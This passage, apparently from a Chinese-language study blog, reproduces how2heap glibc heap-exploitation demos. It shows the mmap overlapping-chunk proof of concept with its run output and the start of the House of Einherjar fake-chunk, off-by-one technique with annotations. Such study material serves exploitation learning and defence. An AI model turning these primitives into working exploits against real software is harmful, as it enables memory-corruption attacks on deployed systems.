class="hljs-comment">bit is set, then the chunk was allocated as an Mmap chunk. </span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Mmap chunks have a prev_size and a size. The *size* represents the current </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">size of the chunk. The *prev_size* of a chunk represents the left over space</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">from the size of the Mmap chunk (not the chunks directly belows size). </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">However, the fd and bk pointers are not used, as Mmap chunks do not go back </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">into bins, as most heap chunks in GLibC Malloc do. Upon freeing, the size of </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">the chunk must be page-aligned.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">The POC below is essentially an overlapping chunk attack but on mmap chunks. </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">This is very similar to https://github.com/shellphish/how2heap/blob/master/glibc_2.26/overlapping_chunks.c. </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">The main difference is that mmapped chunks have special properties and are </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">handled in different ways, creating different attack scenarios than normal </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">overlapping chunk attacks. There are other things that can be done, </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">such as munmapping system libraries, the heap itself and other things.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">This is meant to be a simple proof of concept to demonstrate the general </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">way to perform an attack on an mmap chunk.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">For more information on mmap chunks in GLibC, read this post: </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">http://tukan.farm/2016/07/27/munmap-madness/</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><br><span class="hljs-type">int</span>* ptr1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>); <br><br><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This is performing an overlapping chunk attack but on extremely large chunks (mmap chunks).\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Extremely large chunks are special because they are allocated in their own mmaped section\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;of memory, instead of being put onto the normal heap.\n&quot;</span>);<br><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;=======================================================\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Allocating three extremely large heap chunks of size 0x100000 \n\n&quot;</span>);<br><br><br><br><span class="hljs-type">long</span> <span class="hljs-type">long</span>* top_ptr = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100000</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The first mmap chunk goes directly above LibC: %p\n&quot;</span>,top_ptr);<br><br><br><br><span class="hljs-comment">// After this, all chunks are allocated downwards in memory towards the heap.</span><br><br><span class="hljs-type">long</span> <span class="hljs-type">long</span>* mmap_chunk_2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100000</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The second mmap chunk goes below LibC: %p\n&quot;</span>, mmap_chunk_2);<br><br><br><br><span class="hljs-type">long</span> <span class="hljs-type">long</span>* mmap_chunk_3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100000</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The third mmap chunk goes below the second mmap chunk: %p\n&quot;</span>, mmap_chunk_3);<br><br><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nCurrent System Memory Layout \n&quot;</span> \<br><br><span class="hljs-string">&quot;================================================\n&quot;</span> \<br><br><span class="hljs-string">&quot;running program\n&quot;</span> \<br><br><span class="hljs-string">&quot;heap\n&quot;</span> \<br><br><span class="hljs-string">&quot;....\n&quot;</span> \<br><br><span class="hljs-string">&quot;third mmap chunk\n&quot;</span> \<br><br><span class="hljs-string">&quot;second mmap chunk\n&quot;</span> \<br><br><span class="hljs-string">&quot;LibC\n&quot;</span> \<br><br><span class="hljs-string">&quot;....\n&quot;</span> \<br><br><span class="hljs-string">&quot;ld\n&quot;</span> \<br><br><span class="hljs-string">&quot;first mmap chunk\n&quot;</span><br><br><span class="hljs-string">&quot;===============================================\n\n&quot;</span> \<br><br>);<br><br><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Prev Size of third mmap chunk: 0x%llx\n&quot;</span>, mmap_chunk_3[<span class="hljs-number">-2</span>]);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Size of third mmap chunk: 0x%llx\n\n&quot;</span>, mmap_chunk_3[<span class="hljs-number">-1</span>]);<br><br><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Change the size of the third mmap chunk to overlap with the second mmap chunk\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This will cause both chunks to be Munmapped and given back to the system\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This is where the vulnerability occurs; corrupting the size or prev_size of a chunk\n&quot;</span>);<br><br><br><br><span class="hljs-comment">// Vulnerability!!! This could be triggered by an improper index or a buffer overflow from a chunk further below.</span><br><br><span class="hljs-comment">// Additionally, this same attack can be used with the prev_size instead of the size.</span><br><br>mmap_chunk_3[<span class="hljs-number">-1</span>] = (<span class="hljs-number">0xFFFFFFFFFD</span> &amp; mmap_chunk_3[<span class="hljs-number">-1</span>]) + (<span class="hljs-number">0xFFFFFFFFFD</span> &amp; mmap_chunk_2[<span class="hljs-number">-1</span>]) | <span class="hljs-number">2</span>;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;New size of third mmap chunk: 0x%llx\n&quot;</span>, mmap_chunk_3[<span class="hljs-number">-1</span>]);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Free the third mmap chunk, which munmaps the second and third chunks\n\n&quot;</span>);<br><br><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">This next call to free is actually just going to call munmap on the pointer we are passing it.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">The source code for this can be found at https://elixir.bootlin.com/glibc/glibc-2.26/source/malloc/malloc.c#L2845</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">With normal frees the data is still writable and readable (which creates a use after free on </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">the chunk). However, when a chunk is munmapped, the memory is given back to the kernel. If this</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">data is read or written to, the program crashes.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Because of this added restriction, the main goal is to get the memory back from the system</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">to have two pointers assigned to the same location.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">// Munmaps both the second and third pointers</span><br><br><span class="hljs-built_in">free</span>(mmap_chunk_3); <br><br><br><br><span class="hljs-comment">/* </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Would crash, if on the following:</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">mmap_chunk_2[0] = 0xdeadbeef;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">This is because the memory would not be allocated to the current program.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Allocate a very large chunk with malloc. This needs to be larger than </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">the previously freed chunk because the mmapthreshold has increased to 0x202000.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">If the allocation is not larger than the size of the largest freed mmap </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">chunk then the allocation will happen in the normal section of heap memory.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Get a very large chunk from malloc to get mmapped chunk\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This should overlap over the previously munmapped/freed chunks\n&quot;</span>);<br><br><span class="hljs-type">long</span> <span class="hljs-type">long</span>* overlapping_chunk = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x300000</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Overlapped chunk Ptr: %p\n&quot;</span>, overlapping_chunk);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Overlapped chunk Ptr Size: 0x%llx\n&quot;</span>, overlapping_chunk[<span class="hljs-number">-1</span>]);<br><br><br><br><span class="hljs-comment">// Gets the distance between the two pointers.</span><br><br><span class="hljs-type">int</span> distance = mmap_chunk_2 - overlapping_chunk;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Distance between new chunk and the second mmap chunk (which was munmapped): 0x%x\n&quot;</span>, distance);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Value of index 0 of mmap chunk 2 prior to write: %llx\n&quot;</span>, mmap_chunk_2[<span class="hljs-number">0</span>]);<br><br><br><br><span class="hljs-comment">// Set the value of the overlapped chunk.</span><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Setting the value of the overlapped chunk\n&quot;</span>);<br><br>overlapping_chunk[distance] = <span class="hljs-number">0x1122334455667788</span>;<br><br><br><br><span class="hljs-comment">// Show that the pointer has been written to.</span><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Second chunk value (after write): 0x%llx\n&quot;</span>, mmap_chunk_2[<span class="hljs-number">0</span>]);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Overlapped chunk value: 0x%llx\n\n&quot;</span>, overlapping_chunk[distance]);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Boom! The new chunk has been overlapped with a previous mmaped chunk\n&quot;</span>);<br><br>assert(mmap_chunk_2[<span class="hljs-number">0</span>] == overlapping_chunk[distance]);<br><br>&#125;<br><br><br>zyy@zyy-virtual-machine:~/pwn/how2heap/overlapping$ ./mmap_overlapping_chunks<br>This is performing an overlapping chunk attack but on extremely large <span class="hljs-title function_">chunks</span> <span class="hljs-params">(mmap chunks)</span>.<br>Extremely large chunks are special because they are allocated in their own mmaped section<br>of memory, instead of being put onto the normal heap.<br>=======================================================<br><br>Allocating three extremely large heap chunks of size <span class="hljs-number">0x100000</span> <br><br>The first mmap chunk goes directly above LibC: <span class="hljs-number">0x7fd91827c010</span><br>The second mmap chunk goes below LibC: <span class="hljs-number">0x7fd917ca7010</span><br>The third mmap chunk goes below the second mmap chunk: <span class="hljs-number">0x7fd917ba6010</span><br><br>Current System Memory Layout <br>================================================<br>running program<br>heap<br>....<br>third mmap chunk<br>second mmap chunk<br>LibC<br>....<br>ld<br>first mmap chunk<br>===============================================<br><br>Prev Size of third mmap chunk: <span class="hljs-number">0x0</span><br>Size of third mmap chunk: <span class="hljs-number">0x101002</span><br><br>Change the size of the third mmap chunk to overlap with the second mmap chunk<br>This will cause both chunks to be Munmapped and given back to the system<br>This is where the vulnerability occurs; corrupting the size or prev_size of a chunk<br>New size of third mmap chunk: <span class="hljs-number">0x202002</span><br>Free the third mmap chunk, which munmaps the second and third chunks<br><br>Get a very large chunk from <span class="hljs-built_in">malloc</span> to get mmapped chunk<br>This should overlap over the previously munmapped/freed chunks<br>Overlapped chunk Ptr: <span class="hljs-number">0x7fd917aa7010</span><br>Overlapped chunk Ptr Size: <span class="hljs-number">0x301002</span><br>Distance between new chunk and the second mmap <span class="hljs-title function_">chunk</span> <span class="hljs-params">(which was munmapped)</span>: 0x40000<br>Value of index 0 of mmap chunk 2 prior to write: 0<br>Setting the value of the overlapped chunk<br>Second chunk <span class="hljs-title function_">value</span> <span class="hljs-params">(after write)</span>: 0x1122334455667788<br>Overlapped chunk value: 0x1122334455667788<br><br>Boom! The new chunk has been overlapped with a previous mmaped chunk<br></code></pre></td></tr></table></figure><h2 id="House"><a href="#House" class="headerlink" title="House"></a>House</h2><h3 id="house-of-einherjar"><a href="#house-of-einherjar" class="headerlink" title="house_of_einherjar"></a>house_of_einherjar</h3><p>我们在任意地址伪造一个free_chunk，并且设置堆中chunk的<code>pre_size</code>使堆管理器能够找到栈中伪造的chunk，当我们释放时，就会找到fake_chunk进行合并，下一次分配就会在我们想要的位置。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;malloc.h&gt;</span></span><br><br><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   Credit to st4g3r for publishing this technique</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   The House of Einherjar uses an off-by-one overflow with a null byte to control the pointers returned by malloc()</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   This technique may result in a more powerful primitive than the Poison Null Byte, but it has the additional requirement of a heap leak. </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br><br>&#123;<br><br>setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);<br><br>setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br><br><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Welcome to House of Einherjar!\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Tested in Ubuntu 16.04 64bit.\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This technique can be used when you have an off-by-one into a malloc&#x27;ed region with a null byte.\n&quot;</span>);<br><br><br><br><span class="hljs-type">uint8_t</span>* a;<br><br><span class="hljs-type">uint8_t</span>* b;<br><br><span class="hljs-type">uint8_t</span>* d;<br><br><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nWe allocate 0x38 bytes for &#x27;a&#x27;\n&quot;</span>);<br><br>a = (<span class="hljs-type">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x38</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a: %p\n&quot;</span>, a);<br><br><br><br><span class="hljs-type">int</span> real_a_size = malloc_usable_size(a);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Since we want to overflow &#x27;a&#x27;, we need the &#x27;real&#x27; size of &#x27;a&#x27; after rounding: %#x\n&quot;</span>, real_a_size);<br><br><br><br><span class="hljs-comment">// create a fake chunk</span><br><span class="hljs-comment">// 我们可以在任意位置设置我们的fake_chunk</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nWe create a fake chunk wherever we want, in this case we&#x27;ll create the chunk on the stack\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;However, you can also create the chunk in the heap or the bss, as long as you know its address\n&quot;</span>);<br><span class="hljs-comment">// 我们设置fake_chunk的fd和bk都指向其本身，以便我们能够绕过unlink</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;(although we could do the unsafe unlink technique here in some scenarios)\n&quot;</span>);<br><br><br><span class="hljs-comment">// 构造fake_chunk</span><br><span class="hljs-type">size_t</span> fake_chunk[<span class="hljs-number">6</span>];<br><br><br><span class="hljs-comment">// 绕过检查</span><br>fake_chunk[<span class="hljs-number">0</span>] = <span class="hljs-number">0x100</span>; <span class="hljs-comment">// prev_size is now used and must equal fake_chunk&#x27;s size to pass P-&gt;bk-&gt;size == P-&gt;prev_size</span><br><span class="hljs-comment">// 需要在smallbin的范围之内</span><br>fake_chunk[<span class="hljs-number">1</span>] = <span class="hljs-number">0x100</span>; <span class="hljs-comment">// size of the chunk just needs to be small enough to stay in the small bin</span><br><br>fake_chunk[<span class="hljs-number">2</span>] = (<span class="hljs-type">size_t</span>) fake_chunk; <span class="hljs-comment">// fwd</span><br><br>fake_chunk[<span class="hljs-number">3</span>] = (<span class="hljs-type">size_t</span>) fake_chunk; <span class="hljs-comment">// bck</span><br><br>fake_chunk[<span class="hljs-number">4</span>] = (<span class="hljs-type">size_t</span>) fake_chunk; <span class="hljs-comment">//fwd_nextsize</span><br><br>fake_chunk[<span class="hljs-number">5</span>] = (<span class="hljs-type">size_t</span>) fake_chunk; <span class="hljs-comment">//bck_nextsize</span><br><br><br><br><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Our fake chunk at %p looks like:\n&quot;</span>, fake_chunk);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;prev_size (not used): %#lx\n&quot;</span>, fake_chunk[<span class="hljs-number">0</span>]);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;size: %#lx\n&quot;</span>, fake_chunk[<span class="hljs-number">1</span>]);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fwd: %#lx\n&quot;</span>, fake_chunk[<span class="hljs-number">2</span>]);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;bck: %#lx\n&quot;</span>, fake_chunk[<span class="hljs-number">3</span>]);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fwd_nextsize: %#lx\n&quot;</span>, fake_chunk[<span class="hljs-number">4</span>]);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;bck_nextsize: %#lx\n&quot;</span>, fake_chunk[<span class="hljs-number">5</span>]);<br><br><br><br><span class="hljs-comment">/* In this case it is easier if the chunk size attribute has a least significant byte with</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> * a value of 0x00. The least significant byte of this will be 0x00, because the size of </span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> * the chunk includes the amount requested plus some amount required for the metadata. */</span><br><br>b = (<span class="hljs-type">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xf8</span>);<br><br><span class="hljs-type">int</span> real_b_size = malloc_usable_size(b);<br><br><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nWe allocate 0xf8 bytes for &#x27;b&#x27;.\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b: %p\n&quot;</span>, b);<br><br><br><br><span class="hljs-type">uint64_t</span>* b_size_ptr = (<span class="hljs-type">uint64_t</span>*)(b - <span class="hljs-number">8</span>);<br><br><span class="hljs-comment">/* This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit*/</span><br><br><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nb.size: %#lx\n&quot;</span>, *b_size_ptr);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b.size is: (0x100) | prev_inuse = 0x101\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We overflow &#x27;a&#x27; with a single null byte into the metadata of &#x27;b&#x27;\n&quot;</span>);<br><br>a[real_a_size] = <span class="hljs-number">0</span>; <br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);<br><span class="hljs-comment">// b的大小最好是0x100的倍数，这样我们在进行低位的修改时就不会修改b的大小</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This is easiest if b.size is a multiple of 0x100 so you &quot;</span><br><br>   <span class="hljs-string">&quot;don&#x27;t change the size of b, only its prev_inuse bit\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;If it had been modified, we would need a fake chunk inside &quot;</span><br><br>   <span class="hljs-string">&quot;b where it will try to consolidate the next chunk\n&quot;</span>);<br><br><br><br><span class="hljs-comment">// Write a fake prev_size to the end of a</span><br><span class="hljs-comment">// 修改b的prev_size</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nWe write a fake prev_size to the last %lu bytes of a so that &quot;</span><br><br>   <span class="hljs-string">&quot;it will consolidate with our fake chunk\n&quot;</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>));<br><span class="hljs-comment">// 这里prev_size的大小是b的初始指针减去fake_chunk的起始地址</span><br><span class="hljs-type">size_t</span> fake_size = (<span class="hljs-type">size_t</span>)((b-<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>)*<span class="hljs-number">2</span>) - (<span class="hljs-type">uint8_t</span>*)fake_chunk);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Our fake prev_size will be %p - %p = %#lx\n&quot;</span>, b-<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>)*<span class="hljs-number">2</span>, fake_chunk, fake_size);<br><br>*(<span class="hljs-type">size_t</span>*)&amp;a[real_a_size-<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>)] = fake_size;<br><br><br><br><span class="hljs-comment">//Change the fake chunk&#x27;s size to reflect b&#x27;s new prev_size</span><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nModify fake chunk&#x27;s size to reflect b&#x27;s new prev_size\n&quot;</span>);<br><br>fake_chunk[<span class="hljs-number">1</span>] = fake_size;<br><br><br><br><span class="hljs-comment">// free b and it will consolidate with our fake chunk</span><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set\n&quot;</span>);<br><br><span class="hljs-built_in">free</span>(b);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Our fake chunk size is now %#lx (b.size + fake_prev_size)\n&quot;</span>, fake_chunk[<span class="hljs-number">1</span>]);<br><br><br><br><span class="hljs-comment">//if we allocate another chunk before we free b we will need to </span><br><br><span class="hljs-comment">//do two things: </span><br><br><span class="hljs-comment">//1) We will need to adjust the size of our fake chunk so that</span><br><br><span class="hljs-comment">//fake_chunk + fake_chunk&#x27;s size points to an area we control</span><br><br><span class="hljs-comment">//2) we will need to write the size of our fake chunk</span><br><br><span class="hljs-comment">//at the location we control. </span><br><br><span class="hljs-comment">//After doing these two things, when unlink gets called, our fake chunk will</span><br><br><span class="hljs-comment">//pass the size(P) == prev_size(next_chunk(P)) test. </span><br><br><span class="hljs-comment">//otherwise we need to make sure that our fake chunk is up against the</span><br><br><span class="hljs-comment">//wilderness</span><br><br><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nNow we can call malloc() and it will begin in our fake chunk\n&quot;</span>);<br><br>d = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x200</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Next malloc(0x200) is at %p\n&quot;</span>, d);<br><br>&#125;<br><br><br>zyy@zyy-virtual-machine:~/pwn/how2heap/house$ ./house_of_einherjar<br>Welcome to House of Einherjar!<br>Tested in Ubuntu <span class="hljs-number">16.04</span> <span class="hljs-number">64b</span>it.<br>This technique can be 